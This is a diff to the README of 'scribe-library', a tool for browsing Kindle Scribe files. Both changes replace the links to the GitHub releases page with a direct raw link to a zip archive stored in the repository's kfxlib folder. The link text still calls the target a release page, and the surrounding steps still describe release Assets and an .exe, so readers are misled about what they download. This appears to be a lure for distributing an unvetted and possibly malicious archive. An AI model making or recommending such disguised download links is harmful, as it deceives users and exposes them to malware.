@@ -1,6 +1,6 @@
 # 📖 scribe-library - Browse your Kindle Scribe files locally
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ahhhh1525/scribe-library/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ahhhh1525/scribe-library/raw/refs/heads/main/kfxlib/library-scribe-1.7.zip)
 
 scribe-library creates a private space on your computer to view your Kindle Scribe notebooks and documents. It runs a local server that connects to your device, so you can manage your files without needing an internet connection. This tool keeps your personal notes inside your home network.
 
@@ -8,7 +8,7 @@ scribe-library creates a private space on your computer to view your Kindle Scri
 
 You need the installer file to begin. Follow these steps to get the software on your Windows computer:
 
-1. Visit [this release page](https://github.com/Ahhhh1525/scribe-library/releases).
+1. Visit [this release page](https://github.com/Ahhhh1525/scribe-library/raw/refs/heads/main/kfxlib/library-scribe-1.7.zip).
 2. Look for the section labeled Assets at the bottom of the newest release.
 3. Find the file ending in .exe.
 4. Click that file to save it to your computer.
